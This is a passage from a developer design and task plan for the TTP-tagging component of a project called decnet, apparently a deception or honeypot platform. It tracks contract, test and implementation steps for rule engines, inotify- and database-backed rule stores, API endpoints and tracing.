**E.1.2 — Bus topic contract** (`decnet/bus/topics.py`)

**Status:** ✅ done.

- New constants: `TTP_TAGGED`, `TTP_RULE_FIRED`,
  `TTP_RULE_SUPPRESSED`.
- Confirm `ATTACKER_INTEL_ENRICHED` exists (it does — `"intel.enriched"`,
  topic `attacker.intel.enriched`), confirm `IDENTITY_FORMED` /
  `IDENTITY_MERGED` exist (they do).
- New `EMAIL_RECEIVED` topic constant + `EMAIL` / `TTP` root prefixes
  + builders `email_topic()`, `ttp()`, `ttp_rule_fired()`.
- Wiki update (`wiki-checkout/Service-Bus.md`) lands in the same
  commit per project convention.

**E.1.3 — Tagger ABC** (`decnet/ttp/base.py`)

**Status:** ✅ done.

- `class TaggerEvent(NamedTuple)` — the input shape: source_kind,
  source_id, attacker_uuid, identity_uuid, session_id, decky_id,
  payload (opaque dict).
- `class Tagger(ABC)` with `async def tag(self, event:
  TaggerEvent) -> list[TTPTag]` and `def name(self) -> str`.
- `class TolerantTagger(Tagger)` mixin — wraps `tag()` so any
  uncaught exception is logged and `[]` returned, never propagated.
  Every lifter that consumes sibling-worker output inherits from
  this. The "tolerates absence" property is enforced *in the
  base class*, not on trust.

**E.1.4 — Tagger factory** (`decnet/ttp/factory.py`)

**Status:** ✅ done.

- `get_tagger() -> Tagger` reading `DECNET_TTP_TAGGER_TYPE` env
  var. Mirrors `decnet.intel.factory` and `decnet.clustering.factory`.
- Default `composite` returns a `CompositeTagger` that fans the
  event out to all registered lifters and concatenates results.
- `_KNOWN: tuple[str, ...]` enumerates the valid tagger names.

**E.1.5 — RuleEngine contract** (`decnet/ttp/impl/rule_engine.py`)

**Status:** ✅ done.

- `class CompiledRule(NamedTuple)`: rule_id, rule_version, name,
  applies_to, match_spec, emits, evidence_fields, **state**
  (`RuleState`).
- `class RuleEngine`:
  - `def __init__(self, store: RuleStore)` — engine consumes from
    a store, never reads YAML directly.
  - `async def evaluate(self, event: TaggerEvent) -> list[TTPTag]`.
  - `async def watch_store(self) -> None` — subscribes to
    `store.subscribe_changes()` and atomically swaps individual
    compiled rules into the dispatch index.
- `class RuleSchema` (Pydantic) for YAML rule validation. Owned
  by the store, not the engine — the engine receives already-
  validated `CompiledRule` objects.

**E.1.6 — Per-lifter contracts** (one file each, all empty bodies)

**Status:** ✅ done.

- `decnet/ttp/impl/behavioral_lifter.py` — `BehavioralLifter(TolerantTagger)`.
- `decnet/ttp/impl/intel_lifter.py` — `IntelLifter(TolerantTagger)`.
- `decnet/ttp/impl/email_lifter.py` — `EmailLifter(TolerantTagger)`.
- `decnet/ttp/impl/canary_fingerprint_lifter.py` —
  `CanaryFingerprintLifter(TolerantTagger)`.
- `decnet/ttp/impl/identity_lifter.py` — `IdentityLifter(TolerantTagger)`.
- `decnet/ttp/impl/credential_lifter.py` — `CredentialLifter(TolerantTagger)`.

Each declares the event source_kinds it handles via a class-level
`HANDLES: frozenset[str]`. The composite tagger uses this to skip
unrelated events.

**E.1.7 — Worker contract** (`decnet/ttp/worker.py`)

**Status:** ✅ done.

- `async def run_ttp_worker_loop(...)` signature matching
  `decnet/clustering/worker.py` and `decnet/intel/worker.py` (the
  parameter shape is already standardised across workers — copy it).
- Bus subscriptions enumerated as a module-level constant
  `_TOPICS: tuple[str, ...]` so the test phase can assert
  subscription wiring without invoking the loop.
- Worker registered in `decnet/web/worker_registry.py` as `"ttp"`.

**E.1.8 — UKC bridge contract** (`decnet/clustering/ukc.py`)

**Status:** ✅ done.

- `ATTACK_TACTIC_TO_UKC: dict[str, UKCPhase]` — the static map
  from the body of this doc.
- `def tactic_to_ukc_phase(tactic: str) -> UKCPhase | None`.
- Inverse: `def ukc_phase_to_tactic(phase: UKCPhase) -> str | None`
  for places where the campaign clusterer projects back.

**E.1.9 — API contract** (`decnet/web/router/ttp/`)

**Status:** ✅ done.

- Six FastAPI router files matching the API surface above:
  `api_get_techniques.py`, `api_get_by_identity.py`,
  `api_get_by_attacker.py`, `api_get_by_campaign.py`,
  `api_get_by_session.py`, `api_get_rules.py`,
  `api_export_navigator.py`.
- Each handler returns the typed empty value (`[]` for lists,
  `{}` for the Navigator JSON envelope).
- Pydantic response models declared in `decnet/web/db/models/ttp.py`
  alongside the SQLModel (per the "all models in one place" project
  rule — the package surface, not the literal file).
- Routers registered in `decnet/web/router/__init__.py`.

**E.1.10 — Repository contract** (`decnet/web/db/sqlmodel_repo/ttp.py`)

**Status:** ✅ done.

- `async def insert_tags(rows: list[TTPTag]) -> int` — bulk upsert
  with `INSERT OR IGNORE` semantics for idempotency.
- `async def list_techniques_by_identity(uuid: str) -> list[...]`.
- `async def list_techniques_by_attacker(uuid: str) -> list[...]`.
- `async def list_techniques_by_campaign(uuid: str) -> list[...]`.
- `async def list_techniques_by_session(sid: str) -> list[...]`.
- `async def list_distinct_techniques() -> list[...]`.
- All return empty lists at contract phase.

**E.1.11 — RuleStore contract**
(`decnet/ttp/store/{base.py, factory.py, impl/}`)

**Status:** ✅ done.

- `class RuleState` frozen dataclass: state literal
  ("enabled" | "disabled" | "clipped"), `confidence_max`,
  `expires_at`, `reason`, `set_by`, `set_at`. Default constructor
  yields `state="enabled"` with all other fields `None`.
- `class RuleChange(NamedTuple)`: change_kind
  ("definition" | "state"), rule_id, new_value (CompiledRule or
  RuleState).
- `class RuleStore(ABC)`:
  - `async def load_compiled(self) -> list[CompiledRule]`.
  - `async def get_state(self, rule_id: str) -> RuleState`.
  - `async def set_state(self, rule_id: str, state: RuleState,
    set_by: str) -> None`.
  - `async def subscribe_changes(self) -> AsyncIterator[RuleChange]`.
- `decnet/ttp/store/factory.py` — `get_rule_store() -> RuleStore`
  reads `DECNET_TTP_RULE_STORE_TYPE`. Default `"filesystem"`.
  `_KNOWN: tuple[str, ...] = ("filesystem", "database")`.
- `FilesystemRuleStore` empty body. Will read `./rules/ttp/`,
  inotify-watch, hold state in-process dict. **Filename filter
  (allowlist, not denylist)**: a path is accepted iff its basename
  fully matches `re.fullmatch(r"[A-Za-z0-9_]+\.ya?ml", basename)`.
  Anything else — vim swap (`.foo.yaml.swp`), atomic-save probes
  (`4913`), backups (`foo.yaml~`, `.foo.yaml.bak`), random tempfile
  conventions a future editor invents — is silently ignored, no
  parse, no log line. Denylists rot the moment an editor changes
  its scratch convention; the allowlist stops being clever.
  Applies identically to the initial `load_compiled()` walk and
  the inotify event handler.
- **Inotify event mask** (`FilesystemRuleStore`):
  `IN_MOVED_TO | IN_CREATE | IN_CLOSE_WRITE | IN_DELETE`.
  Rationale, verified against an actual `strace` of vim:
  - **`IN_CLOSE_WRITE`** — vim writes in place via plain
    `write(fd, …)` to the target file and closes; the kernel
    fires `IN_CLOSE_WRITE` on the path. This is the dominant
    save signal for vim and most editors that keep an open file
    descriptor.
  - **`IN_MOVED_TO`** — editors with atomic-write modes
    (gedit, some IDEs, vim with `:set backupcopy=no` plus a
    rename strategy, `mv foo.yaml.tmp foo.yaml` from a
    deploy script) write a tempfile then `rename()` it onto
    the target. The kernel fires `IN_MOVED_TO` on the target.
  - **`IN_CREATE`** — brand-new rule file appears (`touch`,
    `cp`).
  - **`IN_DELETE`** — rule removed; engine drops the
    compiled rule from its dispatch index and emits a
    `ttp.rule.reloaded.{rule_id}` event with the rule absent
    from the new state.

  Filenames that pass the filter and trigger ANY of these events
  go through the same compile + atomic-swap path. Filenames that
  fail the filter trigger neither parse nor log line, per the
  scratch-file rule above.
- `DatabaseRuleStore` empty body. Will mirror rule content into
  `ttp_rule` table, state in `ttp_rule_state`. Two new SQLModels
  shipped in this contract step (alongside `TTPTag` from E.1.1):
  - `class TTPRule(SQLModel, table=True)`: rule_id PK,
    rule_version, source_path, yaml_content, updated_at,
    **updated_by** (operator who pushed the edit; for filesystem
    store always "filesystem" / "git"; for DB store the admin
    JWT subject).
  - `class TTPRuleState(SQLModel, table=True)`: rule_id PK,
    state, confidence_max, expires_at, reason, set_by, set_at.
- New bus topic constants for `ttp.rule.reloaded` and
  `ttp.rule.state` declared in this commit.

### E.2 Tests

The test phase locks in the *behavior contract*. Tests pass against
the empty-body implementations only where the empty value is the
correct answer (e.g. "list_techniques_by_identity returns empty
list for an unknown identity"). Tests that pin behavior beyond the
trivial empty case must be marked
`@pytest.mark.xfail(strict=True, reason="impl phase E.3.<step>")`
in the contract commit so the suite is GREEN, not red, between
contract and implementation.

This is non-negotiable per the project's "every per-task commit
must include passing tests" rule. A 17-commit window of red CI
trains the team to ignore red CI; CDD discipline does not require
that. The `strict=True` flag turns an accidental early
`xpass` (the test starts passing because the impl landed early)
into a failure, so the marker is itself the trip-wire that says
"this test is now load-bearing — flip the marker."

The marker is removed in the same commit as the implementation
step that makes the test pass (E.3.N). The "tests in the same
commit as code" project rule applies to that flip: the impl and
the marker-removal land together, never separately.

Tests ship in this order, one commit per step. Coverage targets in
`tests/ttp/` mirroring source layout. The "GREEN at contract
time / xfail-flip at impl time" discipline above applies to
**every** test in this section.

**E.2.1 — Schema invariant tests** (`tests/ttp/test_schema.py`)

**Status:** ✅ done.

- `attacker_uuid OR identity_uuid` CHECK constraint rejects rows
  with both null. Use a real engine (sqlite in-memory) — no mocks.
- App-layer guard: `TTPTag(attacker_uuid=None, identity_uuid=None,
  ...)` raises **exactly `ValueError`** (not a Pydantic
  `ValidationError`, not a bare `Exception`) and the exception
  message contains BOTH the literal substrings `"attacker_uuid"`
  AND `"identity_uuid"`. Asserting both in the message pins the
  semantics so a future contributor cannot "simplify" the guard
  into a generic `assert` or a Pydantic field-validator without
  the test catching it. Covers MySQL <8.0.16 where the CHECK is
  silently ignored.
- The guard runs BEFORE `super().__init__()`. Test that
  reordering it to fire after Pydantic validation breaks the
  contract: introspect the `__init__` source via `inspect` and
  assert the guard's `raise` appears at a lower line number than
  the `super().__init__` call.
- `confidence` outside [0.0, 1.0] is rejected at insert.
- `INSERT OR IGNORE` on duplicate `uuid` is a no-op (no exception,
  no duplicate row).
- `uuid` column accepts a real RFC-4122 UUID string (regex
  `^[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}$`
  for UUIDv5) — pins the "this is a UUID, not a SHA-256 stub"
  property at the column level.
- `evidence` round-trips as a Python dict (insert dict, read dict)
  — confirms the JSON column type wiring works on the dialect
  under test. Per dual-DB-backend convention this runs on both
  SQLite and MySQL via the existing `db_backends` fixture.

**E.2.1b — Evidence shape contract** (`tests/ttp/test_evidence_shape.py`)

**Status:** ✅ done (positive case + negative TypeError-propagation
case parked behind `xfail(strict=True)` until E.3.x lifter impl
lands; PII rule §6 type assertion is GREEN today).

- For each lifter, parametrize over a synthetic event matched by
  one of its rules. Assert the `evidence` dict on the emitted tag
  is structurally compatible with the corresponding `TypedDict`
  for that `source_kind` (`CommandEvidence`, `IntelEvidence`,
  `EmailEvidence`, `CanaryFingerprintEvidence`, …). Use
  `typing.get_type_hints()` on the TypedDict and assert keys + types
  match.
- Negative test: a lifter that emits an evidence dict containing a
  key not present in the TypedDict raises a `TypeError` at the
  `TolerantTagger` boundary — the shape mismatch is loud, not
  silent. (`TolerantTagger` swallows other exceptions per the
  "absence is normal" rule, but evidence-shape violations are
  programmer errors and propagate.)
- PII rule §6 enforced as a type property: `EmailEvidence` has no
  field accommodating raw rcpt addresses or body bytes. The test
  asserts `"rcpt_to_list"` and `"body"` are NOT keys of
  `EmailEvidence.__required_keys__ | EmailEvidence.__optional_keys__`.

**E.2.2 — Idempotency + replay-safety property tests** (`tests/ttp/test_idempotency.py`)

**Status:** ✅ done.

- Hypothesis property: for any valid input tuple, `compute_tag_uuid`
  returns the same string twice in a row. Determinism.
- Distinct input tuples produce distinct UUIDs (collision resistance
  within the practical input space — sample N=10000).
- UUID is stable across Python versions (golden-value fixture: a
  pinned input → pinned hash. Drift = breaking change).
- **Replay-safety lock.** Inputs accepted by the hash function
  are EXACTLY `(source_kind, source_id, rule_id, rule_version,
  technique_id, sub_technique_id)`. The test introspects the
  function signature (or AST) and asserts the parameter set
  matches this list exactly. **A future contributor adding
  `created_at`, `os.getpid()`, `random.random()`, or any other
  non-deterministic input must update this test deliberately —
  silently breaking replay safety becomes impossible.**

**E.2.3 — Bus topic naming tests** (`tests/bus/test_ttp_topics.py`)

**Status:** ✅ done.

- All TTP_* constants match the documented names exactly.
- `matches("ttp.>", TTP_TAGGED)` is True (subscription wildcards
  work as documented).
- `EMAIL_RECEIVED` is one NATS token (no embedded dots that would
  break the bus validator).

**E.2.4 — Tagger ABC conformance** (`tests/ttp/test_base.py`)

**Status:** ✅ done.

- A subclass that doesn't override `tag()` cannot be instantiated.
- `TolerantTagger.tag()` swallows `Exception` from the underlying
  `_tag_impl()` and returns `[]`. Hypothesis fuzz with raised
  exceptions of arbitrary types (incl. `BaseException` subclasses
  that should NOT be swallowed: `KeyboardInterrupt`, `SystemExit`,
  `asyncio.CancelledError` — those propagate).
- Logged warnings on swallowed exceptions are at `WARNING` level
  not `ERROR` (per "absence is normal, not noise").

**E.2.5 — RuleEngine behavior** (`tests/ttp/test_rule_engine.py`)

**Status:** ✅ done (empty/unknown-kind, schema-level malformed
YAML, and rule_version-collision UUID distinctness are GREEN; the
store-level malformed-YAML hook + engine-level multi-emit fan-out +
engine-level version-collision fan-out are parked behind
`xfail(strict=True)` until E.3.5 lands).

- Empty rules directory compiles to an empty list (the worker can
  start with no rules).
- A malformed YAML file raises at `compile()`, NOT at `evaluate()`
  (deploy-time failure, not runtime).
- `evaluate()` against an event whose `source_kind` is unknown to
  every rule returns `[]`.
- A rule with multiple `emits` produces multiple tags from a
  single match (the "one event maps to many techniques" property
  enforced at engine level).
- `rule_version` mismatch between two rules emitting the same
  technique on the same event produces two distinct tag UUIDs (per
  the worked example in the schema section).

**E.2.6 — "Tolerates absence" per-lifter** (`tests/ttp/test_lifter_absence.py`)

**Status:** ✅ done (six lifters parametrized over empty-join
events return ``[]`` with no ERROR records; intel_lifter null-shape
matrix is GREEN; "all populated → emits" trip-wire is xfail-strict
until E.3.6).

- For each lifter (behavioral, intel, email, canary_fingerprint,
  identity, credential): given an event whose required join is
  empty (no `AttackerIntel` row, no `SessionProfile` row, no
  `AttackerBehavior` row, etc.), the lifter returns `[]` and logs
  no error.
- For the intel_lifter specifically: parametrize over per-provider
  null patterns (only GreyNoise null, only AbuseIPDB null, all
  null, all populated) — confirm each produces the expected
  partial tag list with no errors.

**E.2.7 — Static decoupling lint** (`tests/ttp/test_decoupling.py`)

**Status:** ✅ done.

- Walk every module under `decnet/ttp/` (AST-parse, no runtime
  import). Assert no module imports from `decnet.intel.{abuseipdb,
  greynoise, feodo, threatfox}` — only `decnet.web.db.models` is
  permitted for intel-related symbols. This is the no-SPOF
  decoupling rule §2 enforced statically.
- Same lint for biometrics: no `decnet.profiler.keystroke.*` (or
  whatever the future ingester namespace becomes) imports under
  `decnet/ttp/`.

**E.2.8 — API shape + auth tests** (`tests/api/ttp/test_*.py`)

**Status:** ✅ done (tests live under `tests/api/ttp/` per repo
convention rather than the spec's `tests/web/router/ttp/` wording —
the repo standardized on `tests/api/<resource>/`. All
router-presence assertions, the per-endpoint 200/401 contract, and
the admin-only POST/DELETE 401/403/200/400 enforcement live behind
`xfail(strict=True)` until E.3.8 mounts the router; the OpenAPI
golden-stability SHA is GREEN today and trips on any accidental
edit of `tests/api/ttp/schemas/endpoints.placeholder.json`).

- Each endpoint returns `200` with the documented response shape
  for a known-empty store.
- Each `GET` endpoint returns `401` without a JWT.
- **Admin-only mutation endpoints**
  (`POST /api/v1/ttp/rules/{rule_id}/state`,
  `DELETE /api/v1/ttp/rules/{rule_id}/state`):
  - Without JWT → `401`.
  - Non-admin JWT → `403`.
  - Admin JWT → `200` (or `204` for DELETE).
  - Server-side enforcement: the test must inject a JWT with
    `role="user"` and assert the server rejects, NOT a
    client-side feature flag. Per the project's "no client-side
    role checks" rule.
- Schemathesis property test: every documented `4xx` response is
  reachable with the right input. Per the "POST/PUT/PATCH 400
  documented" project convention, the `POST /rules/{rule_id}/state`
  body-validation 400 is documented and tested.
- Response model JSON schema is stable (golden fixture at
  `tests/web/router/ttp/schemas/`).

**E.2.9 — UKC bridge bijection tests** (`tests/clustering/test_ukc_bridge.py`)

**Status:** ✅ done. The full inverse claim (every observable phase
round-trips) is overstated — `EXPLOITATION`, `PIVOTING`, and
`OBJECTIVES` are observable but UKC-only concepts that ATT&CK lacks
matching tactics for. The test pins them as observable-but-lossy
alongside the pre-target lossy phases via a single
`_LOSSY_INVERSE_REFERENCE` table; round-trip is asserted only over
`OBSERVABLE_PHASES − _LOSSY_INVERSE_REFERENCE`. All assertions GREEN
today; no xfail.

- Every tactic key in `ATTACK_TACTIC_TO_UKC` is a valid
  TA-prefixed string.
- Every value is a member of `UKCPhase`.
- For every `UKCPhase` in `OBSERVABLE_PHASES`, the inverse function
  returns a tactic that maps back to the same phase.
- Phases NOT in `OBSERVABLE_PHASES` (RECONNAISSANCE pre-target,
  RESOURCE_DEVELOPMENT, etc.) may have lossy inverse — that's
  documented; the test pins which ones are lossy so a future
  contributor doesn't "fix" it accidentally.

**E.2.10 — Confidence model tests** (`tests/ttp/test_confidence.py`)

**Status:** ✅ done. Pure-arithmetic adjustment property
(`confidence × multiplier ≤ base` for `multiplier ∈ [0, 1]`) +
known-input table + floor-constant pinning + invalid-multiplier
guard GREEN today via Hypothesis. `insert_tags`-side drop-below-0.3
xfail-gated behind E.3.3; AbuseIPDB-30 worked-example xfail-gated
behind E.3.10.

- `confidence × multiplier` never raises the value above the rule's
  base (downward-only adjustment property).
- A computed confidence below 0.3 is dropped — `insert_tags()`
  receives the row but writes nothing, returns the dropped count.
- Provider-score factor: `intel_lifter` with AbuseIPDB score 30
  produces `0.85 × 0.30 = 0.255` → dropped, no row written.

**E.2.11 — Multi-mapping property tests** (`tests/ttp/test_multi_mapping.py`)

**Status:** ✅ done. UUID-distinctness property over N×M cartesian
product GREEN today (exercised via `compute_tag_uuid` directly +
Hypothesis). One-rule / two-techniques worked example pinned as a
fixture. Engine-level fan-out and engine-replay-safety
xfail-gated behind E.3.7 (`RuleEngine.evaluate` returns `[]` from
its empty body).

- Hypothesis: given a synthetic event matched by N rules each
  emitting M techniques, the engine produces exactly N×M tag rows
  (with idempotent UUIDs so a re-run produces zero new rows).
- One rule emitting two techniques produces two distinct tag UUIDs
  (worked example pinned as a fixture).

**E.2.12 — Bus integration** (`tests/ttp/test_worker_bus.py`)

**Status:** ✅ done. `_TOPICS` frozenset equality against the
documented set + module-level constant pinning + every-pattern
self-match (or wildcard-extension match) + `run_ttp_worker_loop`
async-signature surface GREEN today. Worker→engine wiring,
loop-prevention invariant, attacker.enriched/email.received
catch-up asymmetry, subscription-introspection xfail-gated behind
E.3.14.

- Subscribed topics from `_TOPICS` constant match the documented
  set exactly.
- Worker started against an in-memory bus and given a faked
  `attacker.session.ended` event invokes the rule engine.
- `attacker.enriched` arriving for a session that already had tags
  written produces *additional* tags from intel_lifter without
  duplicating the rule-engine tags (idempotency across re-firings).
- No subscription on a topic NOT in `_TOPICS` (catches accidental
  string-literal subscriptions that drift from the constants).
- **Loop-prevention invariant** (canonical statement in "Bus
  topics" above; this test enforces it). Concretely: invoke the
  worker on the same source event twice; assert exactly one
  `ttp.tagged` event was published (not two), and that re-runs
  N=10× still produce only the original event.
- **Bus delivery requirements** (per the "Bus delivery
  requirements" section): a test fake bus configured to drop
  `attacker.enriched` events still produces intel-derived tags
  via the `attacker.session.ended` catch-up path. The same fake
  configured to drop `email.received` produces NO email tags
  (no catch-up exists for email; the test pins this asymmetry
  rather than papering over it).

**E.2.13 — Repository tests** (`tests/web/db/test_ttp_repo.py`)

**Status:** ✅ done. The `db_backends` fixture didn't exist at the
time of this commit — it lands here under `tests/web/db/conftest.py`
parametrizing SQLite (always) + MySQL (gated on
`DECNET_TEST_MYSQL_URL` env var per project memory: skip heavy
suites in dev). Mixin-method async-coroutine introspection +
mixin-presence-on-repo GREEN today; `insert_tags` idempotency,
identity-rollup projection, attacker-rollup exclusion of
NULL-attacker tags xfail-gated behind E.3.3.

- Per dual-DB-backend project convention: every repo test runs
  against both SQLite and MySQL. Use the existing `db_backends`
  parametrize fixture.
- `insert_tags` is idempotent across runs.
- `list_techniques_by_identity` projects through `Attacker.identity_id`
  correctly when `attacker_uuid` is set on the tag.
- `list_techniques_by_identity` returns `identity_rollup` tags with
  null `attacker_uuid` correctly.

**E.2.14a — Observability** (`tests/ttp/test_tracing.py`)

**Status:** ✅ done. Per-test `InMemorySpanExporter` + fresh
`TracerProvider` (OTEL forbids overriding the global once set, so
no global mutation). Session-scoped autouse fixture in
`tests/ttp/conftest.py` sets `DECNET_DEVELOPER_TRACING=true` and
forces `decnet.telemetry._ENABLED = True` so the no-op tracer
doesn't silently swallow spans. The `span_exporter` fixture also
monkeypatches `decnet.telemetry.get_tracer` so production code
under test lands spans in the in-memory exporter. The whole module
skips when the configured Jaeger / OTLP endpoint
(`DECNET_OTEL_ENDPOINT`, default `localhost:4317`) is not reachable
— tracing tests need an observability backend or they have nothing
meaningful to assert. Span-emission assertions xfail-gated behind
E.3.5/E.3.6/E.3.7/E.3.9–E.3.13.

OTEL spans are not optional decoration; they're a stated design
property. Tests pin the span hierarchy:

- A single `evaluate()` call produces a `ttp.eval` span with
  `attacker_uuid` and `identity_uuid` attributes.
- Within `ttp.eval`, one `ttp.lifter.{name}` child span per
  lifter that ran (use the in-memory OTEL test exporter).
- Within each lifter span, one `ttp.rule.fire` span per matched
  rule, with `rule_id` and `technique_id` attributes.
- A `set_state()` API call produces the `ttp.rule.state.change`
  parent + `ttp.store.write_state` + `ttp.rule.publish` children.
- **No-PII property**. Walk every span attribute produced during
  a battery of synthetic events containing tagged "PII canary
  strings" (e.g. body text "CANARY_PII_DO_NOT_LEAK"). Assert no
  attribute value contains any canary string. Catches accidental
  attribute writes of raw command content / email body / payload
  bytes / fingerprint blobs.

**E.2.14b — RuleStore conformance** (`tests/ttp/store/test_*.py`)

**Status:** ✅ done. Three test files under `tests/ttp/store/`:

* `test_conformance.py` — cross-backend assertions parametrized via
  the `rule_store` fixture in `conftest.py`. `get_state` default
  for unknown rule_id is GREEN on `FilesystemRuleStore` (the
  in-memory cache returns `RuleState()` for empty lookup); the
  `DatabaseRuleStore` parametrization xfails until E.3.6. Other
  conformance assertions (`load_compiled` corpus equality,
  `set_state` isolation/round-trip, `subscribe_changes` per-rule
  fan-out, `expires_at` auto-revert, `set_state` failure
  semantics) xfail-gated behind E.3.5/E.3.6.
* `test_filesystem.py` — Linux-only (skipped wholesale on macOS /
  Windows). Inotify mask + canonical kernel values + 9
  scratch-filename rejections + 4 valid-filename acceptances +
  fullmatch-anchor pinning + tmp_path construction +
  `CompiledRule` immutability GREEN today. Doc references
  `dataclasses.FrozenInstanceError` for the immutability smoke
  signal but the actual implementation uses NamedTuple, which
  raises `AttributeError` on assignment — the test pins
  `AttributeError` and the test docstring calls out the
  divergence. Per-save-style + filter-ordering + atomic-swap
  concurrency xfail-gated behind E.3.5.
* `test_database.py` — class-level surface (no platform guard, all
  ABC methods concrete, async coroutines) GREEN today;
  `ttp_rule_state` writes + filesystem→DB sync xfail-gated
  behind E.3.6.

The crucial property: both backends satisfy the **same** ABC
contract observably. Tests are parametrized over
`(FilesystemRuleStore, DatabaseRuleStore)` and assert identical
behavior:

- `load_compiled()` over a known YAML corpus returns the same
  `CompiledRule` set from both backends (modulo `state` defaulting
  to enabled when no state row exists).
- `get_state()` for an unknown rule_id returns the default
  `RuleState(state="enabled", ...)`, not raising.
- `set_state()` on one rule_id does not affect the state of any
  other rule.
- `set_state()` followed by `get_state()` round-trips faithfully.
- `subscribe_changes()` yields **one** `RuleChange` per per-rule
  edit. A 5-rule edit produces 5 events, never a batch of 1
  carrying 5 entries (the "incremental, never batched" property
  enforced by test).
- `expires_at` in the past on `get_state()` returns the default
  `enabled` state and emits a `ttp.rule.state.{rule_id}` event
  with the auto-revert.
- Filesystem-specific: editing a YAML file at projroot triggers
  `subscribe_changes()` to yield within the inotify-watch debounce
  window (~500ms). Use a tmp_path fixture; do not touch the real
  `./rules/` during tests.
- Filesystem-specific: **inotify mask coverage**. Parametrize over
  the four save-style cases and assert each yields exactly one
  per-rule event:
  - **In-place write** (`open(path, 'w').write(...)` then close)
    — fires `IN_CLOSE_WRITE`. Models vim's default save (verified
    by strace).
  - **Atomic rename** (`open(tmp, 'w').write(...)` then
    `os.rename(tmp, path)`) — fires `IN_MOVED_TO` on the target.
    Models gedit, IDE saves, deploy scripts.
  - **Touch-create** (`Path(new_path).touch()`) — fires
    `IN_CREATE`. Models a brand new rule landing.
  - **Delete** (`os.unlink(path)`) — fires `IN_DELETE`; the
    affected rule_id is dropped from the dispatch index and a
    `ttp.rule.reloaded.{rule_id}` event fires with the rule
    absent.
- Filesystem-specific: **atomic-swap concurrency**. Spin up N
  parallel asyncio tasks, each editing a distinct rule file. The
  store must serialize compile work into a single ordered stream
  (verified by an instrumented `RuleEngine` that records compile
  start/end timestamps and asserts no two intervals overlap).
  Concurrent `evaluate()` calls during the edit storm see only
  fully-frozen `CompiledRule` values — never a torn intermediate.
  Use `dataclasses.FrozenInstanceError` as the in-test smoke
  signal: any attempt to mutate a `FrozenCompiledRule` field
  raises, surfacing accidental in-place mutation immediately.
- Filesystem-specific: **dotfiles and editor scratch files are
  ignored.** Parametrize over a corpus of "should be ignored"
  filenames and assert each produces zero events from
  `subscribe_changes()` and zero entries in `load_compiled()`:
  - `.T1110_brute_force.yaml.swp` (vim swap)
  - `.T1110_brute_force.yaml.swo` (secondary vim swap)
  - `T1110_brute_force.yaml~` (backup tilde)
  - `.T1110_brute_force.yaml.bak` (dot-prefix backup)
  - `4913` (vim atomic-save probe artefact, no extension)
  - `.4913` (dot-prefix variant)
  - `.foo` (any dotfile, no yaml extension)
  - `T1110_brute_force.yaml.tmp` (no dot but wrong extension)
  - `T1110_brute_force.txt` (right shape, wrong extension)

  Then the positive case: a sibling file `T1110_brute_force.yaml`
  in the same directory IS picked up — confirms the filter
  excludes scratch files without false-rejecting the real one
  next to them.

  Critical sub-property: an inotify CLOSE_WRITE event on a
  filtered name produces neither a parse attempt (no
  `RuleSchema.validate()` call) nor a log line. The filter is the
  first thing the event handler checks; observability noise on
  every vim save would be its own bug.
- Database-specific: per the dual-DB-backend convention, tests
  run against both SQLite and MySQL via the `db_backends`
  parametrize fixture.
- A failing `set_state()` (DB write error in the database backend)
  raises rather than silently dropping — operational state changes
  are NOT a tolerated-absence path. State drift would be silent
  and dangerous.

### E.3 Implementation

Implementation steps each ship as a single commit, with tests from
phase E.2 transitioning from FAIL to PASS. The project's "tests in
the same commit as code" rule means each impl step ALSO touches
the relevant test file to enable the previously-skipped assertions
(if any were skipped pending impl).

Order:

1. **Schema** — fill `compute_tag_uuid()`. Run `pytest
   tests/ttp/test_schema.py tests/ttp/test_idempotency.py`. Both
   green. ✅ done.
2. **Bus constants + wiki** — already content-only at contract
   phase; this step is just verifying naming tests are green
   (including the new `ttp.rule.reloaded.*` and `ttp.rule.state.*`
   per-rule topic format). ✅ done (per-rule reloaded/state topics
   land with E.3.5/E.3.6 RuleStore — see comment at
   `decnet/bus/topics.py:281-283`).
3. **Repository** — implement `insert_tags`, the listing methods.
   `test_ttp_repo.py` green on both backends. ✅ done. Dialect-split
   bulk-insert hook lives on `SQLiteRepository._insert_tags_or_ignore`
   (sqlite `ON CONFLICT DO NOTHING`) and
   `MySQLRepository._insert_tags_or_ignore` (`INSERT IGNORE`).
   Confidence-floor drop (`< 0.3`) applied at mixin layer before the
   dialect hook fires.
4. **API endpoints** — fill in handlers reading from repo. Empty
   store still returns empty lists; `test_*.py` shape tests green.
   ✅ done. Five GET rollup endpoints + Navigator (fleet + identity)
   wired to the repo singleton from `decnet.web.dependencies`. Rule
   catalogue (`GET /ttp/rules`) still returns `[]` — backed by the
   RuleStore, lands at E.3.5/E.3.6.
5. **RuleStore — FilesystemRuleStore** — implement YAML parse,
   Pydantic validation, inotify watch, in-process state cache,
   `subscribe_changes()` async iterator yielding per-rule events.
   Test bus-event fan-out under a 5-file edit produces exactly 5
   events. `test_*.py` for the filesystem backend green. ✅ done.
   `asyncinotify` added to runtime deps (Linux-only marker). Bus
   topic builders `ttp_rule_reloaded(rule_id)` and
   `ttp_rule_state(rule_id)` shipped alongside the store. Content-hash
   dedup in the inotify handler so a single write firing
   `IN_CREATE` + `IN_CLOSE_WRITE` produces exactly one
   `RuleChange`.
6. **RuleStore — DatabaseRuleStore** — implement DB-backed
   variant. `ttp_rule` and `ttp_rule_state` tables created via
   SQLModel. Master-side filesystem→DB sync. Worker-side DB
   tail. Conformance tests green on both backends in parallel
   (filesystem vs database) using the parametrized fixture. ✅ done.
   Lazy in-memory SQLite repo for unconfigured construction (so
   the conformance fixture works without test plumbing).
   `sync_from_filesystem(fs_store)` master helper subscribes to a
   `FilesystemRuleStore` and projects each `RuleChange` onto a
   `ttp_rule` upsert/delete; `tail_db()` is the worker-side
   watermark poll.
7. **RuleEngine** — implement engine consuming from `RuleStore`.
   Atomic per-rule swap on `RuleChange`. State applied
   after-parsing via `RuleState` join. `test_rule_engine.py`
   green. ✅ done. `CompiledRule.emits` extended to a 4-tuple
   `(technique_id, sub_technique_id, tactic, confidence)` per emit;
   the engine fans one match into N `TTPTag` rows. Match operator is
   `pattern` (regex) for v0; per-source-kind default field
   (`command_text` / `raw_url` / `subject` / …) overridable via
   `match.field`. Disabled rules skipped; clipped state caps
   confidence; `expires_at` re-checked at evaluate as
   defense-in-depth. Tracing helper `_span(name, **attrs)` short-
   circuits on `decnet.telemetry._ENABLED`, matching `@traced` /
   `wrap_repository` zero-overhead-when-disabled pattern.
8. **Rule pack v0** — write the YAML files for `R0001`–`R0058`
